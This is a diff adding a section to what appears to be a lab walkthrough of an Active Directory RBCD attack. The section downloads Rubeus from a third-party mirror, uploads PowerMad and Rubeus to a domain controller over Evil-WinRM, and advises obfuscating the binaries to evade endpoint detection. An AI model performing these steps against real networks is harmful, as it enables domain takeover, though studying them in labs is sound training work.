@@ -1163,7 +1163,50 @@ ObjectGUID                : 553cd9a3-86c4-4d64-9e85-5146a98c868e
 
 ### 4.5 Acquire and Upload the RBCD Tooling
 
+The RBCD attack needs a tool to create a computer account and a tool to request Kerberos tickets; PowerMad and Rubeus provide these and must be transferred to the target before the attack can run.
 
+**Command (on the attack host — obtain the tools):**
+
+```
+# PowerMad ships with PowerShell Empire on Kali
+cp /usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network/powermad.ps1 ./Powermad.ps1
+
+# Rubeus — download a precompiled GhostPack binary
+wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe
+```
+
+**Command (in the Evil-WinRM session — upload to the target):**
+
+```
+cd C:\Users\support\Documents
+upload Powermad.ps1
+upload Rubeus.exe
+```
+
+**Breakdown:**
+
+- `cp .../powermad.ps1 ./Powermad.ps1`
+    - **Description:** Copies the bundled PowerMad script into the working directory.
+    - **Purpose:** Stages the module locally so Evil-WinRM can upload it.
+- `wget .../Rubeus.exe`
+    - **Description:** Downloads a precompiled Rubeus binary.
+    - **Purpose:** Provides the Kerberos-abuse tool used for the later S4U request.
+- `upload <file>`
+    - **Description:** Evil-WinRM built-in that pushes a local file to the current remote directory.
+    - **Purpose:** Places both tools on the DC where they will be executed. Bare filenames resolve against the directory Evil-WinRM was launched from; use an absolute local path if launched elsewhere.
+
+**Theory — tool provenance:** GhostPack (Rubeus) does not distribute official compiled binaries; precompiled mirrors are convenient for lab use, but in a real engagement the binary should be compiled from source and, where possible, obfuscated to avoid trusting a third-party build and to evade endpoint detection.
+
+**Result:**
+
+```
+Info: Uploading .../Powermad.ps1 to C:\Users\support\Documents\Powermad.ps1Data: 179940 bytes of 179940 bytes copiedInfo: Upload successful!
+Info: Uploading .../Rubeus.exe to C:\Users\support\Documents\Rubeus.exeData: 595968 bytes of 595968 bytes copiedInfo: Upload successful!
+```
+
+_What this gives you:_ PowerMad and Rubeus are staged in `C:\Users\support\Documents` on the DC, ready to create the computer account and perform the S4U ticket request.
+
+_Next:_ Import PowerMad and create the attacker-controlled computer account `FAKE-COMP01$` (block 5.5).
 
 <div align="center">
 <br>
